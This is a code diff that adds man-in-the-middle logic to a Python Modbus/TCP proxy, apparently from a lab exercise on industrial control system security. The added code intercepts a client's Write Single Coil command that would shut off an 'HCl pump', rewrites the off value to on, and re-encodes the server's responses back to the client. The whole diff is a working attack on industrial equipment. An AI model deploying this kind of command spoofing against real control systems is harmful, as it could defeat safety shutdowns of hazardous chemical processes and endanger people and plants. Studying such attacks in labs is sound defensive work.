@@ -39,6 +39,8 @@ MITM_PROXY_PORT = 5030
 ACTUAL_SERVER_HOST = "127.0.0.1"
 ACTUAL_SERVER_PORT = 5020
 
+global changeData
+
 class MITMModbusProxy:
     def __init__(self, client_host, client_port, server_host, server_port):
         self.client_host = client_host
@@ -54,18 +56,25 @@ class MITMModbusProxy:
             self.server_host, self.server_port
         )
         print(f">> Connected to server at {self.server_host}:{self.server_port}")
+        changeData = False
+
         try:
             while True:
                 data = await reader.read(1024)
                 if not data:
                     break
 
-                # TODO: Manipulate the client data here, if desired
-
-                print(data)
-
+                parsed_data_map = self.parse_data(data)
+                
+                # If the client is trying to shut off the HCl pump for the first time (i.e. changeData == False)
+                if parsed_data_map['function_code'] == 0x05 and parsed_data_map["quantity_of_coils"] == b'\x00\x00' and not changeData:
+                    changeData = True
+                
+                # Manipulate the data if needed, else pass along the normal client data
+                manipulated_data = self.transform_client_data(parsed_data_map) if changeData else data
+                        
                 # Forward to the server
-                server_writer.write(data)
+                server_writer.write(manipulated_data)
                 await server_writer.drain()
 
                 # Await the server's response
@@ -74,9 +83,11 @@ class MITMModbusProxy:
                     break
 
                 # TODO: Manipulate server data here, if desired
-
+                parsed_response_map = self.parse_response(response)
+                manipulated_data = self.transform_server_data(parsed_response_map) if changeData else response
+                
                 # Write the response back to the client
-                writer.write(response)
+                writer.write(manipulated_data)
                 await writer.drain()
 
         except Exception as e:
@@ -95,6 +106,62 @@ class MITMModbusProxy:
         print("-"*50)
         async with server:
             await server.serve_forever()
+
+    def transform_client_data(self, parsed_data_map):
+        print("transforming client data to spoof server...")
+
+        # Case 1: if the function_code is 'Write Single Register' and the value is 0
+        if parsed_data_map['function_code'] == 0x05 and parsed_data_map["quantity_of_coils"] == b'\x00\x00':
+            old_value = parsed_data_map["quantity_of_coils"]
+            parsed_data_map["quantity_of_coils"] = b'\xFF\x00'
+            print(f"\t**Spoofing client command: WRITE {old_value} --> WRITE {parsed_data_map["quantity_of_coils"]}")
+
+        manipulated_data = self.create_new_command(parsed_data_map)
+
+        return manipulated_data
+
+    def transform_server_data(self, parsed_response_map):
+        print("transforming server data to spoof client...")
+
+        manipulated_data = self.create_new_command(parsed_response_map)
+        return manipulated_data
+
+    def parse_data(self, data):
+        parsed_data = {}
+        parsed_data["transaction_id"] = data[0:2]
+        parsed_data["protocol_id"] = data[2:4]
+        parsed_data["length"] = data[4:6]
+        parsed_data["unit_id"] = data[6]
+        parsed_data["function_code"] = data[7]
+        parsed_data["starting_addr"] = data[8:10]
+        parsed_data["quantity_of_coils"] = data[10:12]
+
+        return parsed_data
+    
+    def parse_response(self, response):
+        parsed_response = {}
+        parsed_response["transaction_id"] = response[0:2]
+        parsed_response["protocol_id"] = response[2:4]
+        parsed_response["length"] = response[4:6]
+        parsed_response["unit_id"] = response[6]
+        parsed_response["function_code"] = response[7]
+        parsed_response["starting_addr"] = response[8:10]
+        parsed_response["quantity_of_coils"] = response[10:12]
+
+        return parsed_response    
+
+    def create_new_command(self, parsed_data_map):
+        manipulated_data = b''
+
+        manipulated_data += (parsed_data_map["transaction_id"])
+        manipulated_data += (parsed_data_map["protocol_id"])
+        manipulated_data += (parsed_data_map["length"])
+        manipulated_data += (parsed_data_map["unit_id"]).to_bytes(1, byteorder='big')
+        manipulated_data += (parsed_data_map["function_code"]).to_bytes(1, byteorder='big')
+        manipulated_data += (parsed_data_map["starting_addr"])
+        manipulated_data += (parsed_data_map["quantity_of_coils"])
+        
+        return manipulated_data
 
 if __name__ == "__main__":
     proxy = MITMModbusProxy(
